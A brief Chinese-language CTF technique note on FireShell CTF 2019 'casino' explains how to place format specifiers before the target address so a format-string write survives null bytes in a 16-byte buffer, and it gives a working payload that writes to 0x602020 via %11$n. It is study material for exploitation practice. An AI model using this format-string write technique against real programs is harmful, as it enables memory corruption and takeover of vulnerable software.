---

<a id="null-byte-address-fragmentation-in-small-buffers-fireshell-2019"></a>
## 小缓冲区中的空字节地址碎片化（FireShell 2019）

**模式：** 有漏洞的缓冲区只有 16 字节，因此常规的 `fmtstr_payload(offset=..., writes={addr: val})` 会失败，因为 `printf` 遇到 `addr` 中第一个空字节就停止。解决办法是把格式说明符放在缓冲区*最前*、目标地址放在*最后*——printf 会先消费完格式字节再碰到空字节。

```python
fmtstr = b"%9x%11$n" + b"\x20\x20\x60\x00\x00\x00\x00\x00"
# printf processes %9x%11$n using the address at offset 11 (the trailing 8 bytes)
# Writes 0x9 (from %9x count) to *0x602020
```

**关键点：** 格式化字符串的空字节限制只在地址出现在格式指令之前时才发作。把指令放前面，让 `printf` 在触碰地址之前先解析它们，再让 `%$n` 引用末尾的地址槽。

**参考：** FireShell CTF 2019 — casino，writeup 12916
